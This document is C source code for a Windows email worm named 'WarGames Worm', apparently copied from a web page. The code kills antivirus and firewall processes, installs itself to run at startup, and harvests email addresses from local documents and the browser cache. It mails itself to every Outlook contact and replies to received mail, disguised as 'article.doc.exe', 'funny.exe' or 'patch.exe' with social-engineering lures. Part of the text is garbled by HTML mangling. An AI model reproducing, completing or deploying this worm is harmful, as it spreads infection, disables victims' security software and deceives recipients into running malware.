#include <stdio.h>
#include <windows.h>
#include <mapi.h>
#include <tlhelp32.h>
#pragma argused
#pragma inline

char &nbsp; &nbsp; filename[100],sysdir[100],copyr[50]="w",winhtm[100],subj[50];
int &nbsp; &nbsp;num,counter=0;
char &nbsp; &nbsp;*alph[]={"a","b","c","d","e","f","g","h","i","j","k","l","m",
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;"n","o","p","q","r","s","t","u","v","w","x","y","z"};
char &nbsp; &nbsp;dn[20]="Wargames Uninstall",ust[40]="rundll32 mouse,disable";
LPSTR &nbsp; &nbsp; SHFolder=".DEFAULT\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders";
BYTE &nbsp; &nbsp;desktop[50],favoris[50],personal[50],cache[50],page[150];
DWORD &nbsp; &nbsp;sizcache=sizeof(desktop),sizfavoris=sizeof(favoris),
&nbsp; &nbsp; sizpersonal=sizeof(personal),sizdesktop=sizeof(cache),spage=sizeof(page);
DWORD &nbsp; &nbsp;type=REG_SZ;
FILE &nbsp; &nbsp;*vbsworm,*winstart;
HANDLE &nbsp; &nbsp;lSnapshot,myproc;
BOOL &nbsp; &nbsp;rProcessFound;

LHANDLE session;
MapiMessage mess;
MapiMessage *mes;
MapiRecipDesc from;
char messId[512],mname[50],maddr[30];
HINSTANCE hMAPI;

WIN32_FIND_DATA &nbsp; &nbsp; &nbsp; &nbsp;ffile;
PROCESSENTRY32 &nbsp; &nbsp; &nbsp; &nbsp; uProcess;
HKEY &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;hReg;
SYSTEMTIME &nbsp; &nbsp; &nbsp; &nbsp;wartime;

void StopAV(char *);
void FindFile(char *,char *);
void GetMail(char *,char *);
void sendmail(char *);

ULONG (PASCAL FAR *mSendMail)(ULONG, ULONG, MapiMessage*, FLAGS, ULONG);
ULONG (PASCAL FAR *mLogoff)(LHANDLE, ULONG, FLAGS, ULONG);
ULONG (PASCAL FAR *mLogon)(ULONG, LPTSTR, LPTSTR, FLAGS, ULONG, LPLHANDLE);
ULONG (PASCAL FAR *mFindNext)(LHANDLE, ULONG, LPTSTR, LPTSTR, FLAGS, ULONG, LPTSTR);
ULONG (PASCAL FAR *mReadMail)(LHANDLE, ULONG, LPTSTR, FLAGS, ULONG, lpMapiMessage FAR *);
ULONG (PASCAL FAR *mFreeBuffer)(LPVOID);

int WINAPI WinMain (HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow)
{
// Kill Some AntiVirus
StopAV("AVP32.EXE"); &nbsp; &nbsp; &nbsp; &nbsp;// AVP
StopAV("AVPCC.EXE"); &nbsp; &nbsp; &nbsp; &nbsp;// AVP
StopAV("AVPM.EXE"); &nbsp; &nbsp; &nbsp; &nbsp;// AVP
StopAV("WFINDV32.EXE"); &nbsp; &nbsp; &nbsp; &nbsp;// Dr. Solomon
StopAV("F-AGNT95.EXE"); &nbsp; &nbsp; &nbsp; &nbsp;// F-Secure
StopAV("NAVAPW32.EXE"); &nbsp; &nbsp; &nbsp; &nbsp;// Norton Antivirus
StopAV("NAVW32.EXE"); &nbsp; &nbsp; &nbsp; &nbsp;// Norton Antivirus
StopAV("NMAIN.EXE"); &nbsp; &nbsp; &nbsp; &nbsp;// Norton Antivirus
StopAV("PAVSCHED.EXE"); &nbsp; &nbsp; &nbsp; &nbsp;// Panda AntiVirus
StopAV("ZONEALARM.EXE"); &nbsp; &nbsp;// ZoneAlarm

// Kill Some Worm
StopAV("KERN32.EXE"); &nbsp; &nbsp; &nbsp; &nbsp;// I-Worm.Badtrans
StopAV("SETUP.EXE"); &nbsp; &nbsp; &nbsp; &nbsp;// I-Worm.Cholera
StopAV("RUNDLLW32.EXE"); &nbsp; &nbsp;// I-Worm.Gift
StopAV("GONER.SCR"); &nbsp; &nbsp; &nbsp; &nbsp;// I-Worm.Goner
StopAV("LOAD.EXE"); &nbsp; &nbsp; &nbsp; &nbsp;// I-Worm.Nimda
StopAV("INETD.EXE"); &nbsp; &nbsp; &nbsp; &nbsp;// I-Worm.Plage - BadTrans
StopAV("FILES32.VXD"); &nbsp; &nbsp; &nbsp; &nbsp;// I-Worm.PrettyPark
StopAV("SCAM32.EXE"); &nbsp; &nbsp; &nbsp; &nbsp;// I-Worm.Sircam
StopAV("GDI32.EXE"); &nbsp; &nbsp; &nbsp; &nbsp;// I-Worm.Sonic
StopAV("_SETUP.EXE"); &nbsp; &nbsp; &nbsp; &nbsp;// I-Worm.ZippedFiles
StopAV("EXPLORE.EXE"); &nbsp; &nbsp; &nbsp; &nbsp;// I-Worm.ZippedFiles
StopAV("ZIPPED_FILES.EXE"); &nbsp; &nbsp;// I-Worm.ZippedFiles

GetModuleFileName(hInst,filename,100);
GetSystemDirectory((char *)sysdir,100);
SetCurrentDirectory(sysdir);
CopyFile(filename,"article.doc.exe",TRUE);
RegCreateKey(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\WarGames Worm",&amp;hReg);
RegSetValueEx(hReg,"DisplayName",0,REG_SZ,(BYTE *)dn,20);
RegSetValueEx(hReg,"UninstallString",0,REG_SZ,(BYTE *)ust,40);
RegCloseKey(hReg);

randomize();
num=rand() % 10;
randname:
strcat(copyr,alph[GetTickCount()%25]);
if(++counter==num) {
&nbsp; &nbsp; strcat(copyr,".exe");
&nbsp; &nbsp; MessageBox(NULL,copyr,"New Copy Name:",MB_OK|MB_ICONINFORMATION);
&nbsp; &nbsp; CopyFile(filename,copyr,FALSE);
&nbsp; &nbsp; WriteProfileString("WINDOWS","RUN",copyr);
&nbsp; &nbsp; WritePrivateProfileString("rename","NUL",filename,"WININIT.INI");
&nbsp; &nbsp; goto endrandname;
&nbsp; &nbsp; }
Sleep(GetTickCount()%100);
goto randname;
endrandname:

hMAPI=LoadLibrary("MAPI32.DLL");
(FARPROC &amp;)mSendMail=GetProcAddress(hMAPI, "MAPISendMail");
RegOpenKeyEx(HKEY_USERS,SHFolder,0,KEY_QUERY_VALUE,&amp;hReg);
RegQueryValueEx(hReg,"Desktop",0,&amp;type,desktop,&amp;sizdesktop);
RegQueryValueEx(hReg,"Favorites",0,&amp;type,favoris,&amp;sizfavoris);
RegQueryValueEx(hReg,"Personal",0,&amp;type,personal,&amp;sizpersonal);
RegQueryValueEx(hReg,"Cache",0,&amp;type,cache,&amp;sizcache);
RegCloseKey(hReg);
GetWindowsDirectory((char *)winhtm,100);

_asm
{
call &nbsp; &nbsp;@wininet
db &nbsp; &nbsp;"WININET.DLL",0
@wininet:
call &nbsp; &nbsp;LoadLibrary
test &nbsp; &nbsp;eax,eax
jz &nbsp; &nbsp;end_asm
mov &nbsp; &nbsp;ebp,eax
call &nbsp; &nbsp;@inetconnect
db &nbsp; &nbsp;"InternetGetConnectedState",0
@inetconnect:
push &nbsp; &nbsp;ebp
call &nbsp; &nbsp;GetProcAddress
test &nbsp; &nbsp;eax,eax
jz &nbsp; &nbsp;end_wininet
mov &nbsp; &nbsp;edi,eax
verf:
push &nbsp; &nbsp;0
push &nbsp; &nbsp;Tmp
call &nbsp; &nbsp;edi
dec &nbsp; &nbsp;eax
jnz &nbsp; &nbsp;verf

end_wininet:
push &nbsp; &nbsp;ebp
call &nbsp; &nbsp;FreeLibrary
end_asm:
jmp &nbsp; &nbsp;end_all_asm

Tmp &nbsp; &nbsp;dd 0

end_all_asm:
}

FindFile(desktop,"*.htm");
FindFile(desktop,"*.doc");
FindFile(favoris,"*.ht*");
FindFile(personal,"*.ht*");
FindFile(personal,"*.doc");
FindFile(personal,"*.xls");
FindFile(personal,"*.asp");
FindFile(cache,".ht*");
FindFile(cache,".php");
FindFile(cache,".asp");
FindFile(winhtm,".ht*");
FindFile(winhtm,".doc");


vbsworm=fopen("wargames.vbs","w");
fprintf(vbsworm,"On Error Resume Next\n");
fprintf(vbsworm,"msgbox %cScripting.FileSystemObject%c\n",34,34);
fprintf(vbsworm,"Set sf=CreateObject(%cScripting.FileSystemObject%c)\n",34,34);
fprintf(vbsworm,"Set sys=sf.GetSpecialFolder(1)\n");
fprintf(vbsworm,"Set OA=CreateObject(%cOutlook.Application%c)\n",34,34);
fprintf(vbsworm,"Set MA=OA.GetNameSpace(%cMAPI%c)\n",34,34);
fprintf(vbsworm,"For Each C In MA.AddressLists\n");
fprintf(vbsworm,"If C.AddressEntries.Count &lt;&gt; 0 Then\n");
fprintf(vbsworm,"For D=1 To C.AddressEntries.Count\n");
fprintf(vbsworm,"Set AD=C.AddressEntries(D)\n");
fprintf(vbsworm,"Set EM=OA.CreateItem(0)\n");
fprintf(vbsworm,"EM.To=AD.Address\n");
fprintf(vbsworm,"EM.Subject=%cHi %c&amp;AD.Name&amp;%c read this.%c\n",34,34,34,34);
fprintf(vbsworm,"body=%cI found this on the web and it is important.%c\n",34,34);
fprintf(vbsworm,"body = body &amp; VbCrLf &amp; %cOpen the attached file and read.%c\n",34,34);
fprintf(vbsworm,"EM.Body=body\n");
fprintf(vbsworm,"EM.Attachments.Add(sys&amp;%c\\article.doc.exe%c)\n",34,34);
fprintf(vbsworm,"EM.DeleteAfterSubmit=True\n");
fprintf(vbsworm,"If EM.To &lt;&gt; %c%c Then\n",34,34);
fprintf(vbsworm,"EM.Send\n");
fprintf(vbsworm,"End If\n");
fprintf(vbsworm,"Next\n");
fprintf(vbsworm,"End If\n");
fprintf(vbsworm,"Next\n");
fclose(vbsworm);
ShellExecute(NULL,"open","wargames.vbs",NULL,NULL,SW_SHOWNORMAL);
Sleep(5000);
DeleteFile("wargames.vbs");

(FARPROC &amp;)mLogon=GetProcAddress(hMAPI, "MAPILogon");
(FARPROC &amp;)mLogoff=GetProcAddress(hMAPI, "MAPILogoff");
(FARPROC &amp;)mFindNext=GetProcAddress(hMAPI, "MAPIFindNext");
(FARPROC &amp;)mReadMail=GetProcAddress(hMAPI, "MAPIReadMail");
(FARPROC &amp;)mFreeBuffer=GetProcAddress(hMAPI, "MAPIFreeBuffer");
mLogon(NULL,NULL,NULL,MAPI_NEW_SESSION,NULL,&amp;session);
if(mFindNext(session,0,NULL,NULL,MAPI_LONG_MSGID,NULL,messId)==SUCCESS_SUCCESS) {
&nbsp; do {
&nbsp; &nbsp; &nbsp;if(mReadMail(session,NULL,messId,MAPI_ENVELOPE_ONLY|MAPI_PEEK,NULL,&amp;mes)==SUCCESS_SUCCESS) {
&nbsp; &nbsp; strcpy(mname,mes-&gt;lpOriginator-&gt;lpszName);
&nbsp; &nbsp; strcpy(maddr,mes-&gt;lpOriginator-&gt;lpszAddress);
&nbsp; &nbsp; mes-&gt;ulReserved=0;
&nbsp; &nbsp; mes-&gt;lpszSubject="Re: Fw:";
&nbsp; &nbsp; mes-&gt;lpszNoteText="I received your mail but I cannot reply immediatly.\n"
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "I send you a nice program. Look at this.\n\n"
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; " &nbsp; &nbsp;See you soon.";
&nbsp; &nbsp; mes-&gt;lpszMessageType=NULL;
&nbsp; &nbsp; mes-&gt;lpszDateReceived=NULL;
&nbsp; &nbsp; mes-&gt;lpszConversationID=NULL;
&nbsp; &nbsp; mes-&gt;flFlags=MAPI_SENT;
&nbsp; &nbsp; mes-&gt;lpOriginator-&gt;ulReserved=0;
&nbsp; &nbsp; mes-&gt;lpOriginator-&gt;ulRecipClass=MAPI_ORIG;
&nbsp; &nbsp; mes-&gt;lpOriginator-&gt;lpszName=mes-&gt;lpRecips-&gt;lpszName;
&nbsp; &nbsp; mes-&gt;lpOriginator-&gt;lpszAddress=mes-&gt;lpRecips-&gt;lpszAddress;
&nbsp; &nbsp; mes-&gt;nRecipCount=1;
&nbsp; &nbsp; mes-&gt;lpRecips-&gt;ulReserved=0;
&nbsp; &nbsp; mes-&gt;lpRecips-&gt;ulRecipClass=MAPI_TO;
&nbsp; &nbsp; mes-&gt;lpRecips-&gt;lpszName=mname;
&nbsp; &nbsp; mes-&gt;lpRecips-&gt;lpszAddress=maddr;
&nbsp; &nbsp; mes-&gt;nFileCount=1;
&nbsp; &nbsp; mes-&gt;lpFiles=(MapiFileDesc *)malloc(sizeof(MapiFileDesc));
&nbsp; &nbsp; memset(mes-&gt;lpFiles, 0, sizeof(MapiFileDesc));
&nbsp; &nbsp; mes-&gt;lpFiles-&gt;ulReserved=0;
&nbsp; &nbsp; mes-&gt;lpFiles-&gt;flFlags=NULL;
&nbsp; &nbsp; mes-&gt;lpFiles-&gt;nPosition=-1;
&nbsp; &nbsp; mes-&gt;lpFiles-&gt;lpszPathName=filename;
&nbsp; &nbsp; mes-&gt;lpFiles-&gt;lpszFileName="funny.exe";
&nbsp; &nbsp; mes-&gt;lpFiles-&gt;lpFileType=NULL;
&nbsp; &nbsp; mSendMail(session, NULL, mes, NULL, NULL);
&nbsp; &nbsp; }
&nbsp; }while(mFindNext(session,0,NULL,messId,MAPI_LONG_MSGID,NULL,messId)==SUCCESS_SUCCESS);
free(mes-&gt;lpFiles);
mFreeBuffer(mes);
mLogoff(session,0,0,0);
FreeLibrary(hMAPI);
}


}

void FindFile(char *folder, char *ext)
{
register bool abc=TRUE;
register HANDLE hFile;
char mail[128];
SetCurrentDirectory(folder);
hFile=FindFirstFile(ext,&amp;ffile);
if(hFile!=INVALID_HANDLE_VALUE) {
&nbsp; &nbsp; while(abc) {
&nbsp; &nbsp; SetFileAttributes(ffile.cFileName,FILE_ATTRIBUTE_ARCHIVE);
&nbsp; &nbsp; GetMail(ffile.cFileName,mail);
&nbsp; &nbsp; if(strlen(mail)&gt;0) {
&nbsp; &nbsp; sendmail(mail);
&nbsp; &nbsp; }
&nbsp; &nbsp; abc=FindNextFile(hFile,&amp;ffile);
&nbsp; &nbsp; }
}

}

void GetMail(char *namefile, char *mail)
{
HANDLE &nbsp; &nbsp;hf,hf2;
char &nbsp; &nbsp;*mapped;
DWORD &nbsp; &nbsp;size,i,k;
BOOL &nbsp; &nbsp;test=FALSE,valid=FALSE;
mail[0]=0;

hf=CreateFile(namefile,GENERIC_READ,FILE_SHARE_READ,0,OPEN_EXISTING,FILE_ATTRIBUTE_ARCHIVE,0);
if(hf==INVALID_HANDLE_VALUE)
&nbsp; &nbsp; return;
size=GetFileSize(hf,NULL);
if(!size)
&nbsp; &nbsp; return;
if(size&lt;8)
&nbsp; &nbsp; return;
size-=100;

hf2=CreateFileMapping(hf,0,PAGE_READONLY,0,0,0);
if(!hf2) {
&nbsp; &nbsp; CloseHandle(hf);
&nbsp; &nbsp; return;
&nbsp; &nbsp; }

mapped=(char *)MapViewOfFile(hf2,FILE_MAP_READ,0,0,0);
if(!mapped) {
&nbsp; &nbsp; CloseHandle(hf2);
&nbsp; &nbsp; CloseHandle(hf);
&nbsp; &nbsp; return;
&nbsp; &nbsp; }

i=0;
while(i<size &&="" !test)="" {="" if(!strncmpi("mailto:",mapped+i,strlen("mailto:")))=""  ="" test="TRUE;" i+="strlen(&quot;mailto:&quot;);" k="0;" while(mapped[i]!="34" mapped[i]!="39" i<size="" k<127)="" if(mapped[i]!=" " )="" mail[k]="mapped[i];" k++;="" if(mapped[i]="='@')" valid="TRUE;" }="" i++;="" else="" if(!valid)="" mail[0]="0;" unmapviewoffile(mapped);="" closehandle(hf2);="" closehandle(hf);="" return;="" void="" sendmail(char="" *tos)="" memset(&mess,0,sizeof(mapimessage));="" memset(&from,0,sizeof(mapirecipdesc));="" wsprintf(subj,"mail="" to="" %s.",tos);="" from.lpszname="NULL;" from.ulrecipclass="MAPI_ORIG;" mess.lpszsubject="subj;" mess.lpsznotetext="I send you this patch.\n" "it="" corrects="" a="" bug="" into="" internet="" explorer="" and="" outlook.\n\n"="" "=""  have="" nice="" day.="" best="" regards.";="" mess.lprecips="(MapiRecipDesc" *)malloc(sizeof(mapirecipdesc));="" if(!mess.lprecips)="" memset(mess.lprecips,0,sizeof(mapirecipdesc));="" mess.lprecips-="">lpszName=tos;
mess.lpRecips-&gt;lpszAddress=tos;
mess.lpRecips-&gt;ulRecipClass=MAPI_TO;
mess.nRecipCount=1;

mess.lpFiles=(MapiFileDesc *)malloc(sizeof(MapiFileDesc));
&nbsp; &nbsp; if(!mess.lpFiles)
&nbsp; &nbsp; return;
memset(mess.lpFiles,0,sizeof(MapiFileDesc));
mess.lpFiles-&gt;lpszPathName=filename;
mess.lpFiles-&gt;lpszFileName="patch.exe";
mess.nFileCount=1;

mess.lpOriginator=&amp;from;

mSendMail(0,0,&amp;mess,0,0);

free(mess.lpRecips);
free(mess.lpFiles);
}

void StopAV(char *antivirus)
{
register BOOL term;
lSnapshot=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
uProcess.dwSize=sizeof(uProcess);
rProcessFound=Process32First(lSnapshot,&amp;uProcess);
while(rProcessFound) {
&nbsp; &nbsp; if(strstr(uProcess.szExeFile,antivirus)!=NULL) {
&nbsp; &nbsp; &nbsp; &nbsp; myproc=OpenProcess(PROCESS_ALL_ACCESS,FALSE,uProcess.th32ProcessID);
&nbsp; &nbsp; &nbsp; &nbsp; if(myproc!=NULL) {
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; term=TerminateProcess(myproc,0);
&nbsp; &nbsp; &nbsp; &nbsp; }
&nbsp; &nbsp; &nbsp; &nbsp; CloseHandle(myproc);
&nbsp; &nbsp; }
&nbsp; &nbsp; rProcessFound=Process32Next(lSnapshot,&amp;uProcess);
}
CloseHandle(lSnapshot);
}